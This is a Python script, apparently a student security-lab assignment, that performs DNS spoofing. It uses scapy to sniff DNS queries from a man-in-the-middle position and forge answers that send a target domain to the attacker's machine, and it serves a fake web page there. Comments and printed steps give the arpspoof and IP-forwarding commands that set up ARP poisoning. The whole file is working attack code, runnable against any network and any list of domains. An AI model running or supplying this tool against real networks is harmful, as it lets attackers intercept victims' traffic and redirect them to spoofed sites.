#!/usr/bin/env python3
# DNS SPOOFING TOOL | Matricula: 2023-0316 | ITLA
# Topologia comun a los 3 ataques:
#   Internet/DNS(8.8.8.8) -> Router Fa0/0:20.23.3.1 -> Fa0/1 -> SW-L2
#   SW-L2 Gig0/0:router Gig0/1:Kali(20.23.3.16) Gig0/2:Victima(20.23.3.50) Gig0/3:PC-Extra(20.23.3.65)
#
# Preparacion (ARP Spoof para MITM):
#   echo 1 > /proc/sys/net/ipv4/ip_forward
#   sudo arpspoof -i eth0 -t 20.23.3.50 20.23.3.1 &
#   sudo arpspoof -i eth0 -t 20.23.3.1  20.23.3.50 &
#
# Uso: sudo python3 dns_spoofing.py --web

from scapy.all import *
import argparse, sys, signal, os
from datetime import datetime

DOMINIO  = "itla.edu.do"
IP_FALSA = "20.23.3.16"   # Kali - SW-L2 Gig0/1
INTERFAZ = "eth0"
GW       = "20.23.3.1"    # Router Fa0/0
VICTIMA  = "20.23.3.50"   # SW-L2 Gig0/2
stats    = {"interceptados": 0, "envenenados": 0, "ignorados": 0}

def banner():
    print("DNS SPOOFING | Matricula: 2023-0316 | ITLA")
    print(f"Objetivo: {DOMINIO} -> {IP_FALSA}")
    print(f"Topologia: Kali eth0(Gig0/1) MITM entre Victima(Gig0/2) y Router(Fa0/0)")

def servidor_web(puerto=80):
    import http.server, threading
    html = f"""<!DOCTYPE html>
<html lang="es"><head><meta charset="UTF-8">
<title>ITLA - DEMO DNS SPOOFING</title>
<style>
body{{font-family:Arial;background:#003366;color:white;
      display:flex;align-items:center;justify-content:center;min-height:100vh}}
.card{{background:rgba(255,255,255,.08);border-radius:12px;padding:40px;
       max-width:600px;width:90%;text-align:center}}
.banner{{background:#cc0000;border-radius:8px;padding:20px;margin-bottom:24px}}
table{{width:100%;border-collapse:collapse;margin-top:16px}}
td{{padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.15);text-align:left}}
td:first-child{{color:rgba(255,255,255,.7);width:40%}}
</style></head><body>
<div class="card">
  <div class="banner">
    <h1>DEMOSTRACION - DNS SPOOFING</h1>
    <h2>Matricula: 2023-0316 | ITLA</h2>
  </div>
  <h3>Servidor web FALSO</h3>
  <table>
    <tr><td>Dominio</td><td><strong>{DOMINIO}</strong></td></tr>
    <tr><td>IP falsa</td><td><strong>{IP_FALSA}</strong> (Kali - Gig0/1)</td></tr>
    <tr><td>Gateway</td><td>{GW} (Router Fa0/0)</td></tr>
    <tr><td>Victima</td><td>{VICTIMA} (SW-L2 Gig0/2)</td></tr>
    <tr><td>Tecnica</td><td>ARP Spoof + DNS Cache Poisoning</td></tr>
    <tr><td>Timestamp</td><td>{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</td></tr>
  </table>
  <p style="color:#aaa;font-size:.85rem;margin-top:20px">
    Laboratorio de Seguridad | ITLA | 2023-0316</p>
</div></body></html>"""

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(html.encode())
            print(f"[WEB] Conexion de {self.client_address[0]} (Gig0/2)")
        def log_message(self, *a): pass

    srv = http.server.HTTPServer(("0.0.0.0", puerto), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"[+] Servidor web falso -> http://{IP_FALSA}:{puerto}")
    print(f"    Simula: {DOMINIO}")

def respuesta_falsa(pkt, ip_falsa, dominios):
    if not pkt.haslayer(DNS) or pkt[DNS].qr != 0: return None
    query = pkt[DNS].qd.qname.decode().rstrip(".")
    stats["interceptados"] += 1
    es_obj = any(query == d or query.endswith("." + d) for d in dominios)
    if not es_obj:
        stats["ignorados"] += 1
        return None
    print(f"\n[!] QUERY DNS INTERCEPTADA")
    print(f"    Dominio  : {query}")
    print(f"    Desde    : {pkt[IP].src} (SW-L2 Gig0/2)")
    print(f"    Respuesta: {ip_falsa} FALSA (Kali Gig0/1)")
    resp = (IP(src=pkt[IP].dst, dst=pkt[IP].src) /
            UDP(sport=53, dport=pkt[UDP].sport) /
            DNS(id=pkt[DNS].id, qr=1, aa=1, rd=1, ra=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNS].qd.qname,
                          type="A", rdata=ip_falsa, ttl=300)))
    stats["envenenados"] += 1
    return resp

def modo_pasivo(iface, ip_falsa, dominios):
    print(f"\n[MODO] DNS Spoofing Pasivo en {iface} (SW-L2 Gig0/1)")
    print(f"  Dominios : {\", \".join(dominios)}")
    print(f"  IP falsa : {ip_falsa}")
    print(f"  Victima  : {VICTIMA} (Gig0/2)")
    print("\n[*] Capturando UDP/53... (Ctrl+C para detener)\n")
    def handle(pkt):
        r = respuesta_falsa(pkt, ip_falsa, dominios)
        if r:
            send(r, iface=iface, verbose=False)
            print("[+] Respuesta falsa enviada")
    sniff(iface=iface, filter="udp port 53", prn=handle, store=False)

def mostrar_stats():
    print(f"\n{\"=\"*50}")
    print("  ESTADISTICAS FINALES")
    print(f"  Interceptadas : {stats[\"interceptados\"]}")
    print(f"  Envenenadas   : {stats[\"envenenados\"]}")
    print(f"  Ignoradas     : {stats[\"ignorados\"]}")
    print(f"{\"=\"*50}\n")

def main():
    banner()
    p = argparse.ArgumentParser(description="DNS Spoofing | 2023-0316 | ITLA")
    p.add_argument("-i", "--interfaz", default=INTERFAZ)
    p.add_argument("--ip-falsa",       default=IP_FALSA)
    p.add_argument("-d", "--dominios",  nargs="+", default=[DOMINIO])
    p.add_argument("--web",            action="store_true")
    a = p.parse_args()
    print(f"Config: interfaz={a.interfaz}(Gig0/1) ip_falsa={a.ip_falsa}")
    print(f"Paso previo:")
    print(f"  echo 1 > /proc/sys/net/ipv4/ip_forward")
    print(f"  sudo arpspoof -i {a.interfaz} -t {VICTIMA} {GW} &")
    print(f"  sudo arpspoof -i {a.interfaz} -t {GW} {VICTIMA} &\n")
    if a.web: servidor_web(80)
    signal.signal(signal.SIGINT, lambda s, f: (mostrar_stats(), sys.exit(0)))
    modo_pasivo(a.interfaz, a.ip_falsa, a.dominios)
    mostrar_stats()

if __name__ == "__main__":
    if os.geteuid() != 0: sys.exit("[!] sudo requerido")
    main()
